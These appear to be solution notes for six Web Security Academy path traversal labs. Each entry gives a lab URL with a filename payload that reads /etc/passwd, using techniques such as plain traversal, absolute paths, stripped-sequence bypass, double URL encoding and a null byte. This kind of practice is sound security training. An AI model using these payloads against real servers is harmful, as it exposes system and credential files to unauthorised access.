# 1 File path traversal, simple case

https://ac581f561ede798cc010098000f7000e.web-security-academy.net/image?filename=../../../etc/passwd

# 2 File path traversal, traversal sequences blocked with absolute path bypass

https://acf31f751f4a3566c0f5402f00e400e7.web-security-academy.net/image?filename=/etc/passwd


# 3 File path traversal, traversal sequences stripped non-recursively

https://ac321f631fe92ce8c0b628c100f900c3.web-security-academy.net/image?filename=....//....//....//etc//passwd

# 4 File path traversal, traversal sequences stripped with superfluous URL-decode

double url encode

https://ac081f391e68b3b0c021ae2f001c000c.web-security-academy.net/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd

# 5 File path traversal, validation of start of path

https://ac3e1fee1fe02c9ac0b52a47000d0034.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd

# 6 File path traversal, validation of file extension with null byte bypass

https://ace11f131fc59847c0404cbd00ce0076.web-security-academy.net/image?filename=../../../etc/passwd%00.jpg